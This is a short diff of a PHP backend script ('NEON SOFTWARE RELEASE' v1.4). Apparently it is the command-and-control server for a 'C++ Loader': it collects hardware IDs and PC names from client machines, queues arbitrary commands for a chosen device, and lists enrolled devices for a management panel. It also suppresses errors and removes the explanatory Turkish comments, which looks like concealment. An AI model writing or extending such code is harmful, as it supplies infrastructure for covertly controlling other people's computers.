@@ -1,5 +1,5 @@
 <?php
-// NEON SOFTWARE RELEASE [v1.3]
+// NEON SOFTWARE RELEASE [v1.4]
 error_reporting(0);
 @ini_set('display_errors', 0);
 header("Access-Control-Allow-Origin: *");
@@ -8,7 +8,6 @@ header("Content-Type: application/json; charset=UTF-8");
 $action = isset($_GET['action']) ? trim($_GET['action']) : '';
 $dataFile = 'devices.json';
 
-// C++ Loader'dan gelen Telemetri ve Komut Kontrolü (POST)
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $hwid      = isset($_POST['hwid']) ? trim($_POST['hwid']) : '';
     $pc_name   = isset($_POST['pc_name']) ? trim($_POST['pc_name']) : 'Bilinmeyen-PC';
@@ -68,7 +67,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     exit();
 }
 
-// Panelden Cihazlara Komut Gönderme
 if ($action === 'send_command') {
     $targetHwid = isset($_GET['hwid']) ? trim($_GET['hwid']) : '';
     $command    = isset($_GET['cmd']) ? trim($_GET['cmd']) : 'none';
@@ -87,7 +85,6 @@ if ($action === 'send_command') {
     exit();
 }
 
-// Yönetim Paneli İçin Cihaz Listeleme
 if ($action === 'get_devices') {
     $devices = file_exists($dataFile) ? json_decode(file_get_contents($dataFile), true) : [];
     if (!is_array($devices)) $devices = [];
